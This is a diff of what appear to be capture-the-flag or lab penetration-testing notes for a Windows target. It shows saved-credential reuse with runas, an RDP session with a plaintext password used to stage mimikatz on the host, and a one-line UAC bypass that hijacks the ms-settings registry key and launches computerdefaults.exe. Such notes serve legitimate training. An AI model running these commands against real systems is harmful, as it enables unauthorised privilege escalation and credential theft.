@@ -891,6 +891,13 @@ C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
 Attempting to start cmd as user "SRV01\mcharles" ...
 ```
 [minikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master/x64)
+
+```
+xfreerdp /u:sadams /p:"totally2brow2harmon@" /v:10.129.234.171 \
+/drive:share,/home/<USER>/mimikatz
+
+copy C:\Users\sadams\mimikatz.exe.exe C:\Users\Administrator\
+```
 ```
 C:\Windows\system32>reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 
